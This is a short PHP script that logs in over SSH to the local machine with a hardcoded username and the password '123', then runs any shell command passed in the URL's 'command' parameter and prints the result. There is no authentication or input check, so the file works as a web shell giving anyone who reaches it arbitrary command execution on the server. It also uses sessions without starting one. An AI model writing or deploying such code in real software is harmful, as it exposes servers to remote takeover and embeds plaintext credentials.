<?php
set_include_path(__DIR__ . '/phpseclib1');
include('Net/SSH2.php');

if (!isset($_SESSION['ssh_i'])) {
	$username = 'developer';
	$password = '123';
	$ssh = new Net_SSH2('127.0.0.1');
	if (!$ssh->login($username, $password)) {
	    exit('Login Failed');
	}
	$_SESSION['ssh_i'] = true;
	$_SESSION['ssh_auth'] = $ssh;
}

print_r($_SESSION['ssh_auth']->exec($_GET['command']));
?>